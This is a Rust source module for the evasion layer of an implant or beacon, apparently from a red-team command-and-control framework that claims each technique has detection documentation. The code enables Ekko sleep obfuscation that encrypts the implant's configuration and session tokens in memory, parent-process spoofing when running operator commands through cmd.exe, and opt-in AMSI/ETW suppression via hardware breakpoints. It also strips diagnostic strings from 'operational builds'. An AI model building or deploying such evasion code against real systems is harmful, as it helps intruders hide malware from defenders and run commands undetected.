//! Phase 2 evasion primitives. Each capability maps to a registry technique
//! (ABR-T005..T012) and ships with its detection counterpart.

pub mod hwbp;
pub mod patch;
pub mod sleep;
pub mod spoof;
pub mod stack;
pub mod stomp;
pub mod syscalls;
pub mod unwind;

/// Lab-only diagnostics (feature `lab-log`). Compiled out of operational
/// builds, so the message strings never exist in the artifact.
macro_rules! note {
    ($($t:tt)*) => {{ #[cfg(feature = "lab-log")] { eprintln!($($t)*); } }};
}
pub(crate) use note;

/// Best-effort zeroization of sensitive buffers (task commands, output,
/// payloads) once the session thread is done with them. Volatile writes
/// keep the compiler from eliding the stores. This narrows — not closes —
/// the residual plaintext surface Ekko leaves outside `.text` (session
/// keys, live buffers); see docs/detections/abr-t006.md.
pub(crate) fn secure_clear(buf: &mut [u8]) {
    for byte in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(byte as *mut u8, 0) };
    }
    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
}

/// Sleep 2.0 sensitive-heap registry (ABR-T006): stable-address buffers
/// whose plaintext must not sit in memory while the beacon sleeps — the
/// embedded configuration (server list, verifying key), session tokens,
/// key material. Regions are RC4-scrambled for the whole sleep window by
/// `sleep::EkkoSleep::sleep` and restored on wake. Registrations must
/// outlive the implant (Box::leak-style storage), and a region may only
/// be registered once — the cipher assumes the set is stable per cycle.
static SENSITIVE: std::sync::Mutex<Vec<(usize, usize)>> = std::sync::Mutex::new(Vec::new());

/// Registers a stable heap region for sleep-time encryption.
pub fn register_sensitive(ptr: usize, len: usize) {
    if ptr == 0 || len == 0 {
        return;
    }
    if let Ok(mut regions) = SENSITIVE.lock() {
        if !regions.contains(&(ptr, len)) {
            regions.push((ptr, len));
        }
    }
}

static HWBP_REQUESTED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

/// Whether the operator opted into ABR-T036 (`--evasion ...hwbp`).
pub fn hwbp_requested() -> bool {
    HWBP_REQUESTED.load(std::sync::atomic::Ordering::Relaxed)
}

/// Snapshot of the registered regions (called by the sleep cycle).
pub(crate) fn sensitive_regions() -> Vec<(usize, usize)> {
    SENSITIVE.lock().map(|r| r.clone()).unwrap_or_default()
}

use std::time::Duration;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Flags {
    pub ekko_sleep: bool,
    pub spoofed_parent: bool,
    /// Opt-in ABR-T036 (AMSI/ETW via hardware breakpoints). Off by
    /// default: every measured environment so far (VBS host, hypervisor
    /// guest) discards user debug-register writes, and the arm path
    /// regressed CLR tasks inside the full implant on the virtualized
    /// lab even where the isolated tests pass — opt in only on hosts
    /// known to honor DR writes.
    pub hwbp_suppression: bool,
}

impl Flags {
    /// Parses a comma-separated list (`ekko,ppid`); unknown names are
    /// rejected so typos never silently disable coverage.
    pub fn parse(spec: &str) -> Result<Self, String> {
        let mut flags = Flags {
            ekko_sleep: false,
            spoofed_parent: false,
            hwbp_suppression: false,
        };
        for name in spec.split(',').map(str::trim).filter(|s| !s.is_empty()) {
            match name {
                "ekko" => flags.ekko_sleep = true,
                "ppid" => flags.spoofed_parent = true,
                "hwbp" => flags.hwbp_suppression = true,
                other => return Err(format!("unknown evasion flag '{other}'")),
            }
        }
        Ok(flags)
    }
}

pub struct Evasion {
    flags: Flags,
    ekko: Option<sleep::EkkoSleep>,
    spawner: Option<spoof::Spawner>,
}

impl Evasion {
    pub fn disabled() -> Self {
        Evasion {
            flags: Flags {
                ekko_sleep: false,
                spoofed_parent: false,
                hwbp_suppression: false,
            },
            ekko: None,
            spawner: None,
        }
    }

    /// Initializes every enabled capability; failures are surfaced instead
    /// of silently degrading to plaintext behavior.
    pub fn enable(flags: Flags) -> Result<Self, String> {
        let ekko = if flags.ekko_sleep {
            Some(unsafe { sleep::EkkoSleep::new() }?)
        } else {
            None
        };
        let spawner = if flags.spoofed_parent {
            Some(unsafe { spoof::Spawner::new() }?)
        } else {
            None
        };
        Ok(Evasion {
            flags,
            ekko,
            spawner,
        })
    }

    pub fn spoofed_parent(&self) -> bool {
        self.flags.spoofed_parent
    }

    /// Publishes the hwbp opt-in for the CLR task path (called once at
    /// enable time).
    pub fn publish(&self) {
        HWBP_REQUESTED.store(
            self.flags.hwbp_suppression,
            std::sync::atomic::Ordering::Relaxed,
        );
    }

    pub fn sleep(&self, duration: Duration) {
        if let Some(ekko) = &self.ekko {
            match ekko.sleep(duration) {
                Ok(()) => {}
                Err(e) => {
                    note!("[!] ekko sleep failed ({e}); plain sleep fallback");
                    let _ = &e;
                    std::thread::sleep(duration);
                }
            }
        } else {
            std::thread::sleep(duration);
        }
    }

    /// Executes a command with the configured evasion. When the spoofed
    /// parent is unavailable — on Windows 11 25H2 (build 26200) the kernel
    /// rejects cross-process PPID attributes with ERROR_INVALID_PARAMETER in
    /// the contexts we tested — falls back to a plain spawn and prefixes the
    /// output so the operator sees which path ran.
    pub fn run_command(&self, command: &str) -> std::io::Result<(u32, Vec<u8>)> {
        if let Some(spawner) = &self.spawner {
            match spawner.run_with_spoofed_parent(&format!("cmd.exe /C {command}")) {
                Ok(result) => return Ok(result),
                Err(e) => {
                    let output = std::process::Command::new("cmd")
                        .args(["/C", command])
                        .output()
                        .map_err(|err| {
                            std::io::Error::other(format!(
                                "ppid spoof failed ({e}); plain spawn failed: {err}"
                            ))
                        })?;
                    let mut data = format!("[i] fallback spawn ({e})\r\n").into_bytes();
                    let mut combined = output.stdout;
                    combined.extend_from_slice(&output.stderr);
                    data.extend(combined);
                    let code = output.status.code().unwrap_or(1) as u32;
                    return Ok((code, data));
                }
            }
        }
        let output = std::process::Command::new("cmd")
            .args(["/C", command])
            .output()?;
        let mut data = Vec::new();
        let mut combined = output.stdout;
        combined.extend_from_slice(&output.stderr);
        data.extend(combined);
        Ok((output.status.code().unwrap_or(1) as u32, data))
    }
}
